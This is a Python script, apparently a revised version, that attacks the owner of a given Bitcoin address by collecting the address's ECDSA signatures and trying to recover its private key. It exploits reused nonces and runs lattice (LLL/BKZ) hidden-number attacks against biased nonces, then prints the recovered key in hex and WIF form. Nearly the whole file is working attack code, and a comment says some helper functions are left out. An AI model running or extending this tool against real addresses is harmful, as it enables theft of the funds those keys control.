#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Final lattice recovery – no false algebraic positives.
Only shared-r (identical nonce) is checked; everything else goes through lattice.
"""

import sys
import json
import requests
import struct
import hashlib
import time
import random
from typing import List, Dict, Optional, Tuple
from collections import defaultdict
from test_lattice_recovery import private_key_hex_to_wif, private_key_to_address, fetch_local_blockchain_data

try:
    from fpylll import IntegerMatrix, BKZ, LLL
    HAVE_FPYLLL = True
except ImportError:
    HAVE_FPYLLL = False

try:
    import coincurve
    HAVE_COINCURVE = True
except ImportError:
    HAVE_COINCURVE = False

try:
    from btc_sig_utils import N, parse_der_sig
except ImportError as exc:
    raise SystemExit("Missing 'btc_sig_utils.py' – cannot continue.") from exc


# =============================================================================
#  YOUR ORIGINAL UTILITY FUNCTIONS (copy them here unchanged)
# =============================================================================
# ... (double_sha256, parse_varint, serialize_varint, parse_tx, etc.)
# I'm omitting them for brevity – you must paste them from your original script.

# =============================================================================
#  ALGEBRAIC CHECK – only shared-r (identical nonce)
# =============================================================================

def algebraic_relations(signatures: List[Dict]) -> Tuple[Optional[int], Optional[str]]:
    """
    Only check for identical r (shared nonce). This is the only relation that
    can be verified globally with certainty.
    Returns (private_key, "shared_r") if found and verified against all signatures.
    """
    q = N
    m = len(signatures)
    if m < 2:
        return None, None

    # Precompute inverses for speed
    data = []
    for sig in signatures:
        r, s, z = sig['r'], sig['s'], sig['z']
        s_inv = pow(s, -1, q)
        data.append((r, s, z, s_inv))

    r_map = {}
    for i, (r, s, z, s_inv) in enumerate(data):
        if r in r_map:
            j = r_map[r]
            r1, s1, z1, s1_inv = data[j]
            r2, s2, z2, s2_inv = data[i]
            if s1 == s2:
                continue
            try:
                # k = (z1 - z2) / (s1 - s2) mod q
                k = ((z1 - z2) * pow(s1 - s2, -1, q)) % q
                d = ((s1 * k - z1) * pow(r1, -1, q)) % q

                # Verify with all signatures
                verified = True
                for t_idx in range(m):
                    if t_idx == i or t_idx == j:
                        continue
                    rt, st, zt, st_inv = data[t_idx]
                    kt = ((zt + rt * d) * st_inv) % q
                    if kt != k:
                        verified = False
                        break
                if verified:
                    return d, "shared_r"
            except ValueError:
                continue
        else:
            r_map[r] = i

    return None, None


# =============================================================================
#  LATTICE SOLVER (multi-model) – unchanged from advanced version
# =============================================================================

def build_hnp_matrix_general(signatures, bit_pos, bit_len, prefix=None):
    q = N
    m = len(signatures)
    dim = m + 2

    if bit_pos == 'top':
        L = 256 - bit_len
        X = 1 << L
        K = q // X
        shift = 1
    elif bit_pos == 'bottom':
        L = bit_len
        K = q // (1 << bit_len)
        shift = pow(2, bit_len, q)
        inv_shift = pow(shift, -1, q)
    else:
        raise ValueError("bit_pos must be 'top' or 'bottom'")

    mat = IntegerMatrix(dim, dim)

    for i, sig in enumerate(signatures):
        r, s, z = sig['r'], sig['s'], sig['z']
        s_inv = pow(s, -1, q)

        if bit_pos == 'top':
            if prefix is not None:
                z = (z - s * prefix * (1 << L)) % q
            t = (r * s_inv) % q
            u = (z * s_inv) % q
        else:  # bottom
            r_adj = (r * inv_shift) % q
            z_adj = (z * inv_shift) % q
            t = (r_adj * s_inv) % q
            u = (z_adj * s_inv) % q

        mat[i, i] = q
        mat[m, i] = t
        mat[m + 1, i] = u

    mat[m, m] = K
    mat[m + 1, m + 1] = 1
    return mat, dim, K, L, shift


def check_lattice_solution_general(mat, dim, K, L, signatures, bit_pos, shift=1, prefix=None, threshold=0.95):
    q = N
    m = dim - 2
    best_x = None
    best_frac = 0.0

    for row in range(dim):
        scaled_x = mat[row, m]
        if scaled_x == 0 or scaled_x % K != 0:
            continue
        x = abs(scaled_x // K) % q
        if x == 0:
            continue

        passes = 0
        for sig in signatures:
            s_inv = pow(sig['s'], -1, q)
            k = ((sig['z'] + sig['r'] * x) * s_inv) % q
            if bit_pos == 'top':
                if prefix is not None:
                    if (k >> L) == prefix:
                        passes += 1
                else:
                    if (k >> L) == 0:
                        passes += 1
            else:  # bottom
                if (k & ((1 << L) - 1)) == 0:
                    passes += 1
        frac = passes / len(signatures)
        if frac > best_frac:
            best_frac = frac
            best_x = x
        if frac >= threshold:
            return x, frac
    return best_x, best_frac


def solve_hnp_subset_general(signatures, bit_pos='top', bit_len=8, prefix=None,
                             block_size=24, timeout_seconds=30):
    if len(signatures) < 5:
        return None, 0.0
    try:
        mat, dim, K, L, shift = build_hnp_matrix_general(signatures, bit_pos, bit_len, prefix)
    except Exception:
        return None, 0.0
    try:
        LLL.reduction(mat)
    except Exception:
        return None, 0.0
    start = time.time()
    try:
        BKZ.reduction(mat, BKZ.Param(block_size=block_size, strategies=BKZ.DEFAULT_STRATEGY))
    except Exception:
        pass
    if time.time() - start > timeout_seconds:
        return None, 0.0
    return check_lattice_solution_general(mat, dim, K, L, signatures, bit_pos, shift, prefix)


# =============================================================================
#  SUBSAMPLING ATTACK with multiple models
# =============================================================================

def subsample_attack_advanced(signatures,
                              sample_sizes=[80, 100, 120],
                              trials_per_size=500,
                              block_sizes=[20, 24, 28],
                              timeout=30) -> Optional[int]:
    if not signatures:
        return None
    total = len(signatures)
    if total < 10:
        print("[!] Too few signatures (<10).")
        return None

    # Models: top-zero, bottom-zero, and constant prefix (try first 16 prefixes)
    models = []
    for bl in [6, 8, 10]:
        models.append(('top', bl, None))
    for bl in [6, 8, 10]:
        models.append(('bottom', bl, None))
    for c in range(16):
        models.append(('top', 8, c))

    random.shuffle(models)

    for sample_size in sample_sizes:
        if sample_size > total:
            sample_size = total
        if sample_size < 8:
            continue
        for block_size in block_sizes:
            for bit_pos, bit_len, prefix in models:
                model_name = f"{bit_pos}_{bit_len}" + (f"_prefix{prefix}" if prefix is not None else "")
                print(f"[*] Model {model_name}, sample={sample_size}, BKZ-{block_size} for {trials_per_size} trials")
                for trial in range(trials_per_size):
                    subset = random.sample(signatures, sample_size)
                    key, frac = solve_hnp_subset_general(subset, bit_pos, bit_len, prefix, block_size, timeout)
                    if key is not None and frac > 0.90:
                        # Verify globally
                        q = N
                        if bit_pos == 'top':
                            L = 256 - bit_len
                            total_passes = 0
                            for sig in signatures:
                                s_inv = pow(sig['s'], -1, q)
                                k = ((sig['z'] + sig['r'] * key) * s_inv) % q
                                if prefix is not None:
                                    if (k >> L) == prefix:
                                        total_passes += 1
                                else:
                                    if (k >> L) == 0:
                                        total_passes += 1
                            overall = total_passes / len(signatures)
                        else:
                            L = bit_len
                            total_passes = 0
                            for sig in signatures:
                                s_inv = pow(sig['s'], -1, q)
                                k = ((sig['z'] + sig['r'] * key) * s_inv) % q
                                if (k & ((1 << L) - 1)) == 0:
                                    total_passes += 1
                            overall = total_passes / len(signatures)
                        if overall > 0.90:
                            print(f"[+] Found key with overall confidence {overall:.2f} (model {model_name})")
                            return key
    return None


# =============================================================================
#  CLUSTERING (time‑based)
# =============================================================================

def cluster_signatures_by_time(signatures, time_window_hours=2):
    clusters = defaultdict(list)
    for sig in signatures:
        t = sig.get('time')
        if t is None:
            clusters[0].append(sig)
        else:
            bucket = int(t // (time_window_hours * 3600))
            clusters[bucket].append(sig)
    return list(clusters.values())


# =============================================================================
#  MAIN ORCHESTRATION
# =============================================================================

def recover_private_key(address: str) -> Optional[int]:
    signatures = fetch_local_blockchain_data(address)
    if not signatures:
        print("[X] No signatures found.")
        return None

    print(f"[+] Collected {len(signatures)} signatures.")

    # 1. Shared-r check (proven reliable)
    key, desc = algebraic_relations(signatures)
    if key:
        print(f"[+] Algebraic relation found: {desc}")
        # Verify against address (will be done in main)
        return key

    # 2. Subsampling lattice attack
    print("[*] Starting advanced subsampling lattice attack...")
    key = subsample_attack_advanced(signatures,
                                    sample_sizes=[min(80, len(signatures)), min(100, len(signatures)), min(120, len(signatures))],
                                    trials_per_size=800,
                                    block_sizes=[20, 24, 28],
                                    timeout=30)
    if key:
        return key

    # 3. Time clustering
    print("[*] Trying time‑based clustering...")
    clusters = cluster_signatures_by_time(signatures, time_window_hours=1)
    for i, cluster in enumerate(clusters):
        if len(cluster) < 8:
            continue
        print(f"[*] Cluster {i}: {len(cluster)} signatures")
        key = subsample_attack_advanced(cluster,
                                        sample_sizes=[min(80, len(cluster))],
                                        trials_per_size=500,
                                        block_sizes=[20, 24],
                                        timeout=30)
        if key:
            return key

    return None


# =============================================================================
#  MAIN ENTRY
# =============================================================================

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 recover_final.py <bitcoin_address>")
        sys.exit(1)

    address = sys.argv[1]
    recovered_key = recover_private_key(address)

    if recovered_key:
        key_hex = f"{recovered_key:064x}"
        wif_comp = private_key_hex_to_wif(key_hex, compressed=True, mainnet=True)
        wif_uncomp = private_key_hex_to_wif(key_hex, compressed=False, mainnet=True)

        # Verify address before declaring success
        addr_match = False
        if HAVE_COINCURVE:
            try:
                addr_comp = private_key_to_address(key_hex, compressed=True)
                addr_uncomp = private_key_to_address(key_hex, compressed=False)
                if addr_comp == address or addr_uncomp == address:
                    addr_match = True
            except Exception as e:
                print(f"[!] Verification error: {e}")

        if addr_match:
            print("\n" + "="*60)
            print("[🔥 SUCCESS] Private key recovered and verified against address!")
            print(f"HEX (64 char): {key_hex}")
            print(f"WIF (compressed)   : {wif_comp}")
            print(f"WIF (uncompressed) : {wif_uncomp}")
            print("="*60)
        else:
            print("\n[!] Candidate private key found but does NOT match target address.")
            print(f"    Target address   : {address}")
            if HAVE_COINCURVE:
                try:
                    addr_comp = private_key_to_address(key_hex, compressed=True)
                    addr_uncomp = private_key_to_address(key_hex, compressed=False)
                    print(f"    Derived (comp)  : {addr_comp}")
                    print(f"    Derived (uncomp): {addr_uncomp}")
                except:
                    pass
            print("[*] This indicates a false positive – continuing search is not possible.")
            print("[*] The signatures likely do not contain a recoverable bias.")
    else:
        print("\n[❌ FAIL] No key recovered after all strategies.")
        print("[*] The nonces may be truly random or the bias is too subtle.")


if __name__ == "__main__":
    main()